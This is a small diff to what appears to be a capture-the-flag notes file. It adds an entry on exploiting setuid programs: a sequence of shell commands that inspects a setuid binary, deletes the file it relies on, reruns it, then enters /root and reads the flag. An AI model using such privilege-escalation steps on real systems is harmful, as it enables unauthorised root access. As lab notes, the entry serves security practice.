@@ -742,6 +742,15 @@ ls -l
 cat flag
 
 ```
+39) Exploiting Setuid Programs
 
-
-
+```
+ls -l
+file welcome
+./welcome
+strings welcome
+rm greetings
+./welcome
+cd /root
+cat flag
+```
